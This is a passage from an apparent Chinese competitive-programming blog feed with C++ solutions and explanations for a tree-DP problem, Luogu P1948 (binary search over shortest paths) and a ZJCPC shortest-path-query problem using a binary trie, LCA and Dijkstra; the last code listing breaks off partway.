class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 6500</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn];</span><br><span class="line"><span class="keyword">int</span> root[maxn],degree[maxn],cnt,n,dp[maxn][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    degree[y]++;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[x];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="built_in">dfs</span>(v);</span><br><span class="line">        dp[x][<span class="number">0</span>]+=<span class="built_in">max</span>(dp[v][<span class="number">1</span>],dp[v][<span class="number">0</span>]);<span class="comment">//状态转移方程</span></span><br><span class="line">        dp[x][<span class="number">1</span>]+=dp[v][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;dp[i][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="built_in">add</span>(y,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!degree[i])&#123;<span class="comment">//找根</span></span><br><span class="line">            <span class="built_in">dfs</span>(i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">max</span>(dp[i][<span class="number">1</span>],dp[i][<span class="number">0</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 动态规划 </category>
          
          <category> 树形dp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P1948题解</title>
      <link href="/2022/02/13/%E6%B4%9B%E8%B0%B7P1948%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/13/%E6%B4%9B%E8%B0%B7P1948%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P1948">洛谷P1948</a>题解。</p><span id="more"></span><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>多年以后，笨笨长大了，成为了电话线布置师。由于地震使得某市的电话线全部损坏，笨笨是负责接到震中市的负责人。该市周围分布着$N(1&lt;=N&lt;=1000)$根据$1……n$顺序编号的废弃的电话线杆，任意两根线杆之间没有电话线连接，一共有$p(1&lt;=p&lt;=10000)$对电话杆可以拉电话线。其他的由于地震使得无法连接。</p><p>第i对电线杆的两个端点分别是$a_i,b_i$，它们的距离为$l_i(1&lt;=l_i&lt;=1000000)$。数据中每对$(a_i,b_i)$只出现一次。编号为1的电话杆已经接入了全国的电话网络，整个市的电话线全都连到了编号N的电话线杆上。也就是说，笨笨的任务仅仅是找一条将1号和N号电线杆连起来的路径，其余的电话杆并不一定要连入电话网络。</p><p>电信公司决定支援灾区免费为此市连接k对由笨笨指定的电话线杆，对于此外的那些电话线，需要为它们付费，总费用决定于其中最长的电话线的长度(每根电话线仅连接一对电话线杆)。如果需要连接的电话线杆不超过k对，那么支出为0.</p><p>请你计算一下，将电话线引导震中市最少需要在电话线上花多少钱？</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>有一说一，不看题解我是万万想不到的，这得是多厉害猜想得到这题是用二分去解决的。不过如果能发现这题的答案的单调性，也许真的可以写出来。</p><p>首先第一点我想的肯定就是最短路啦，但是本题目求的并不是最短路，仔细看，如果路线个数少于 $k$ 个，则0元购，否则将会取得所有路线的最长的一条路径作为费用。可以看到这个题目它并不具备无后效性，它属于有后效性，有后效性即前面做出的选择对之后的选择有影响，如果题目就是求总共的最短路那么它就是无后效性。因为我当前在一个点上的时候你不需要去管我怎么到的这，因为就一个最短路径的值在这里，不管你前面怎么走的这个值是不会影响后面的结果的。</p><p>那么这是一个有后效性的题目那怎么办呢，答案是二分。</p><p>二分的判断条件就是，在我预算为mid的时候能否成功建成，很容易可以找到规律，如果mid能建成，那么&gt;mid的情况一定能建成，如果mid不能建成，那么&lt;mid的情况一定也不能建成，以此作为二分的依据。我们跑最短路的时候只需要检测路线上有多少个超过mid的边即可，如果超过k，说明预算一定超过mid，如果没到，说明预算太多了，大于mid的答案就都排除了，然后每次二分跑一次单源最短路。在 $n=1000$ 的情况下复杂度完全允许。</p><p>就是说，还得多练习，不然完全想不到能用这样的方法去做。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 5005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn*maxn*<span class="number">2</span>];</span><br><span class="line"> <span class="keyword">int</span> n,m,k,cnt,root[maxn],d[maxn],vis[maxn];</span><br><span class="line"> priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt;&gt;s;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(d,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line">    <span class="comment">//memset(vis,0,sizeof(vis));</span></span><br><span class="line">    d[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//vis[1]=1;</span></span><br><span class="line">    s.<span class="built_in">push</span>(&#123;<span class="number">0</span>,<span class="number">1</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> p=s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=p.second;</span><br><span class="line">        <span class="keyword">if</span>(d[point]&lt;p.first)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[point];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(vis[to])<span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//vis[to]=1;</span></span><br><span class="line">            <span class="keyword">if</span>(d[to]&gt;d[point]+(edge[i].w&gt;x?<span class="number">1</span>:<span class="number">0</span>))&#123;</span><br><span class="line">                <span class="comment">//vis[to]=1;</span></span><br><span class="line">                d[to]=d[point]+(edge[i].w&gt;x?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">                s.<span class="built_in">push</span>(&#123;d[to],to&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;mid=%d:d[n]=%d\n&quot;,x,d[n]);</span></span><br><span class="line"><span class="comment">//    for(int i=1;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">//        printf(&quot;%d &quot;,d[i]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//putchar(10);</span></span><br><span class="line">    <span class="keyword">if</span>(d[n]==INF)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(d[n]&gt;k)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P1948_2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">1</span>,r=<span class="number">1000000</span>,ans=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> value=<span class="built_in">bfs</span>(mid);</span><br><span class="line">        <span class="keyword">if</span>(value==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(value==<span class="number">1</span>)&#123;</span><br><span class="line">            l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r=mid<span class="number">-1</span>;</span><br><span class="line">            ans=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> 图论 </category>
          
          <category> 最短路径 </category>
          
          <category> 二分 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZJCPC-D. Shortest Path Query</title>
      <link href="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>今天来复盘一下上次省赛考到的题目，异常地折磨人。</p><span id="more"></span><p>先说一下这题比赛的情况吧，基本上呢，银奖中等偏上的队伍都是做出来了的。</p><p>那我们就看看这题吧。</p><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><p>什么思路在题目名字这里就一目了然了，那自然是最短路径。</p><p>而当我一眼扫过去看到这个数据量的时候瞬间惊呆。$1≤n≤100000，1≤m≤200000$，不仅如此，还有 $q$ 次询问最短路径，$q≤200000$ 当时一看，这玩你妈。给一个点都勉强能过了，这有这么多点，如果按照常规思路，一次单源最短路径复杂度 $nlog_2n$ 然后 $q$ 次询问，总复杂度就是 $qnlog_2n$ 全部以最大值带进去妥妥的超时。所以当时比赛的时候看到这个题目是直接放弃了的，而且英文不好的我留下了悔恨的眼泪。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>但是它还有一个条件，那就是，直接相连的两个点当中，其中一个点的编号一定是另一个点的二进制前缀，这就说明了一点，$2$ 它一定不会跟 $3,6,12……$ 等点连接起来的，因为它们的前缀是 $11_{2}$，而 $2_{10}$ 是 $10_{2}$ 开头的，那么这样的话我们就可以构造一棵 $tire$ 树。像这样子。</p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/2.png" alt="2"></p><p>可以很明显的看出来是一个完全二叉树，这里我们假设往左子树走二进制右添一个 $0$，向左走二进制右添一个 $1$。那你可能会想，这明明边的范围是比点多的，怎么可能是一棵树。没错，但是我们看看，它能不能边横向添加？答案当然是否定的，因为一个得是另一个的前缀，同层次的话二进制位数相同，但是实际值不同，因此不可能满足这个条件。那么我们看看能不能连到其它不是我的祖先的节点呢？答案当然还是否定的，因为我简历的 $tire$ 就是根据二进制后面添 $0$ 还是添 $1$ 来确定分支的，如果你都不是由我在后面添 $0$ 或者是添 $1$ 得到的那你就不可能是我的前缀，也不是我的孙子节点。</p><p>当然在图中 $1$ 和 $4$ 是可以直接相连的，虽然越级但是满足条件。所以它严格意义上来说不是树，但它怎么当成树呢？如果我把一个节点两个直接相连的子图当成子树，问题就解决了。因为两个子图之间肯定没有线连接，这个在刚刚已经证明过了。</p><p>对于每一个节点，我们都去寻找它祖先的最短路径。因为一个节点最多有 $log_2n$ 个祖先，所以跑一下最短路算法问题还是不大的。我们定义 $dis[i][k]$ 为节点 $i$ 到达往上 $k$ 个祖先的最短路径。那么对于任意两点的最短路径，我只需要寻找它们的最近公共祖先，然后答案就是 $a$ 到最近公共祖先的最短路加上 $b$ 到最近公共祖先的最短路。当然我们还有一个情况得考虑，因为 $dis[i][k]$ 的定义仅仅是到它祖先的最短路径，而不是到这个节点的最短路径。因此它祖先的祖先可能有更优的路线。</p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/3.png" alt="3"></p><p>就比如这样一个图，图中我把关键数据标注出来了，无关数据没有标注。</p><p>如果说我要求 $8$ 和 $11$ 的最短路，按照我刚刚的定义很容易算的出来，它们的 $LCA$ 是 $2$，然后 $8$ 和 $11$ 到 $2$ 的最短路径都是 $2$，所以我算出来 $8$ 到 $11$ 的最短路径是 $4$，但是显然这里还有一个更优的解，那就是 $8\to1\to11$ 这样才只有 $2$ 的距离。但是最优的路线只可能存在于它的祖先上面了，其它地方不可能有。因此我们在用刚刚那个算法的时候还得兼顾一下查找 $LCA$ 的祖先的答案。</p><p>这样子的话，假如我们能在规定时间内预处理完数据，那么我们每次查询的时间复杂度就只有 $O(log_2n)$ 了，也不会超时。那么我们看看怎么去预处理这个 $dis$ 数组。</p><p>我们只需要以每一个节点为根节点，和根节点的子节点作为一张图去跑单源最短路即可。对于 $1$ 来说，它的复杂度会是 $O(nlog_2n)$ ，每向下走一层，根节点数量翻倍，子节点数量减半。第二层中，总共复杂度将是 $O(2 \times \frac{n}{2}log_2\frac{n}{2})$ 这么算下来这一层接近 $O(nlog_2n)$ ，此后每一层都接近 $O(nlog_2n)$。它一共有几层呢？$log_2n$层。所以预处理的时间复杂度仅仅只有 $O(n(log_2n)^2)$ 这个时间复杂度是完全不会超时的。</p><p>我们肯定还是选择 $dijsktra$ 算法作为我们的单源最短路算法，加上一个优先队列优化，单源最短路需要每一个点给一个 $d$ 数组标记所有节点到源点的最短路，但是这样空间会炸。所以我们每次跑最短路空间得共用，如何保证他们不会串呢？用标记数组。比如我在以 $1$ 为根节点的时候，我就给标记打上 $1$，当我要更新 $d$ 里面的值的时候我先比较一下上一个使用 $d$ 数组的时候这个标记是否为我当前的根节点，如果是则更新，如果不是，则先初始化为一个很大的值。一般情况下我们选择 $INF=0x3f3f3f3f3f3f3f3f$ 因为这样不容易溢出，也能表示无穷大。</p><p>但是呢，想想 $dijsktra$ 算法还有什么需要注意的？那就是每次选完一个点的时候，它不会再被更新，这个时候我需要再打上一个标记，防止它被其它相连的边重复更新答案。一般情况下我们是选择 $0,1$ 的，但是这里我们要一起用我们就选择根节点的值呗，如果当前根节点和这个值不相等说明这个点没有被添加，那就添加并将标记更新为当前的根节点。</p><p>那么思路清晰了我们就开写。</p><h3 id="循序渐进"><a href="#循序渐进" class="headerlink" title="循序渐进"></a>循序渐进</h3><p>首先开这么几个数组</p><ul><li>$d[i]$ 表示 $i$ 点到当前根节点的最短路径</li><li>$vis1[i]$ 表示 $i$ 节点上一次被 $vis1[i]$ 节点标记为已经添加最短路的答案</li><li>$vis2[i]$ 表示 $i$ 节点的 $d[i]$ 上一次是在以 $vis2[i]$ 为根节点时更新的</li></ul><p>图的话我们采用经典链式前向星存储，优先队列我们存储这么两个信息：</p><ol><li>x节点的最短路径</li><li>x节点</li></ol><p>我们肯定每次是以最路径为关键字进行小根堆构造的，这样保证每次 $pop$ 出来的答案都是当前未被添加的节点中最小的那个答案。</p><p>于是我们不难写出以下代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    p.<span class="built_in">push</span>(&#123;<span class="number">0</span>,root&#125;);<span class="comment">//先把根节点丢进去</span></span><br><span class="line">    d[root]=<span class="number">0</span>;<span class="comment">//自己到自己肯定就是0</span></span><br><span class="line">    vis2[root]=root;<span class="comment">//自己这个答案肯定要被标记，防止下面找到被初始化，当然你如果严格规定所得节点必须&lt;root也没关系，因为下面会被初始化为INF。</span></span><br><span class="line">    <span class="keyword">while</span>(!p.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=p.<span class="built_in">top</span>();</span><br><span class="line">        p.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=x.second;<span class="comment">//当前找到了一个距离最短的节点</span></span><br><span class="line">        <span class="keyword">if</span>(vis1[point]==root)<span class="keyword">continue</span>;<span class="comment">//如果已经被添加过了那么就不做以下处理</span></span><br><span class="line">        vis1[point]=root;<span class="comment">//把这个节点标记为已经添加进了答案中</span></span><br><span class="line">        dis[point][<span class="built_in">cal_c</span>(point,root)]=d[point];<span class="comment">//更新答案，这里的cal_c用于判断root在point的第几个祖先，我们设父亲为第一个祖先。</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=head[point];i;i=edge[i].next)&#123;<span class="comment">//更新所有与之相连的点的答案</span></span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(to&lt;root)<span class="keyword">continue</span>;<span class="comment">//基本判断防止找到root的父亲</span></span><br><span class="line">            <span class="keyword">if</span>(vis2[to]!=root)&#123;<span class="comment">//如果不是root说明上一次使用d[to]数组的还是上一次……啊不，是没用过d[to]这个值，所以要被初始化为一个无穷大</span></span><br><span class="line">                d[to]=INF;</span><br><span class="line">                vis2[to]=root;<span class="comment">//标记</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span>(d[point]+edge[i].w&lt;d[to])&#123;<span class="comment">//单源最短路判断</span></span><br><span class="line">                d[to]=d[point]+edge[i].w;</span><br><span class="line">                p.<span class="built_in">push</span>(&#123;d[to],to&#125;);<span class="comment">//push进优先队列中</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么结合代码中你的注释相信你已经不难理解这个 $dijsktra$ 算法了。</p><p>我们再看看查询这部分的代码应该怎么写，无非就是先求出 $LCA$ ，然后循环 $LCA$ 以及 $LCA$ 祖先的答案。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(q--)&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">int</span> lca=<span class="built_in">LCA</span>(x,y);<span class="comment">//先求最近公共祖先</span></span><br><span class="line">    <span class="keyword">int</span> lx=<span class="built_in">cal_c</span>(x,lca),ly=<span class="built_in">cal_c</span>(y,lca);<span class="comment">//算出他们在那个点的第几个祖先</span></span><br><span class="line">    <span class="keyword">int</span> ans=INF;</span><br><span class="line">    <span class="keyword">while</span>(lca)&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,dis[x][lx]+dis[y][ly]);<span class="comment">//寻找最小值</span></span><br><span class="line">        lx++,ly++;<span class="comment">//每次往上看看那个祖先</span></span><br><span class="line">        lca&gt;&gt;=<span class="number">1</span>;<span class="comment">//完全二叉树怎么找自己的父亲，这个不难吧？</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==INF)<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);<span class="comment">//输出答案</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重要的部分写完了之后那么整个程序就呼之欲出了，但是一定得注意，不开 $long long$ 见祖宗哦。</p><p>然后还有一点就是，既然你开了 $long long$ 一定不要忘了 $inf$ ，不要漏写一半，不然真到比赛要么哭罚时，要么哭整整一题了，不管前者后者，都是很伤的，建议先记在心里。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span 